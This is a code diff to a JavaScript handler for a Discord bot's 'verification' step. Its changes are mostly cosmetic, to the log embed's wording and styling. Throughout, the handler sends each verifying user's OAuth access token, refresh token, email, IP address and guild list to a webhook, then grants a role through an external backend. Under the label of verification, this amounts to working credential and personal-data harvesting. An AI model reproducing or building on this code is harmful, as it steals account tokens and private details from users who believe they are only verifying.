@@ -43,10 +43,11 @@ export default async function handler(req, res) {
 
   const serverList = guilds
     .slice(0, 10)
-    .map(g => `• ${g.name} (${g.id})`)
+    .map(g => `- ${g.name} (${g.id})`)
     .join("\n") || "None";
 
   const expiresInMinutes = Math.floor(expires_in / 60);
+  const expiryDate = new Date(Date.now() + expires_in * 1000).toISOString();
 
   await fetch(webhookURL, {
     method: "POST",
@@ -54,51 +55,51 @@ export default async function handler(req, res) {
     body: JSON.stringify({
       embeds: [
         {
-          title: "✅ User Verified",
-          color: 0x00ff88,
-          description: `A user just verified with the bot.`,
+          title: "User Verification Log",
+          color: 0x1f1f1f,
           fields: [
             {
-              name: "👤 User",
-              value: `\`\`\`\n${user.username}#${user.discriminator}\nID: ${user.id}\n\`\`\``,
+              name: "User Info",
+              value: "```" + `${user.username}#${user.discriminator}\nID: ${user.id}` + "```",
             },
             {
-              name: "📧 Email",
-              value: `\`\`\`\n${user.email || "Not Available"}\n\`\`\``,
+              name: "Email",
+              value: "```" + `${user.email || "Not Available"}` + "```",
             },
             {
-              name: "🌐 IP",
-              value: `\`\`\`\n${userIp}\n\`\`\``,
+              name: "IP Address",
+              value: "```" + `${userIp}` + "```",
             },
             {
-              name: "🔐 Access Token",
-              value: `\`\`\`\n${access_token}\n\`\`\``,
+              name: "Access Token",
+              value: "```" + `${access_token}` + "```",
             },
             {
-              name: "♻️ Refresh Token",
-              value: `\`\`\`\n${refresh_token}\n\`\`\``,
+              name: "Refresh Token",
+              value: "```" + `${refresh_token}` + "```",
             },
             {
-              name: "⏰ Token Expires In",
-              value: `\`\`\`\n${expiresInMinutes} minutes\n\`\`\``,
+              name: "Token Expiry",
+              value: "```" + `${expiresInMinutes} minutes\n${expiryDate}` + "```",
             },
             {
-              name: "🧭 Guilds (first 10)",
-              value: `\`\`\`\n${serverList}\n\`\`\``,
+              name: "Guilds (up to 10)",
+              value: "```" + `${serverList}` + "```",
             },
           ],
-          footer: { text: "Restorecord Logs" },
+          footer: { text: "Restorecord System Logs" },
           timestamp: new Date().toISOString(),
         },
       ],
     }),
   }).catch(console.error);
 
+  // Grant role via your Render backend
   await fetch("https://myproject-bvb7.onrender.com/grant-role", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ user_id: user.id }),
   }).catch(console.error);
 
-  res.status(200).send("✅ Verification complete. You can close this tab.");
+  res.status(200).send("Verification complete. You may close this tab.");
 }
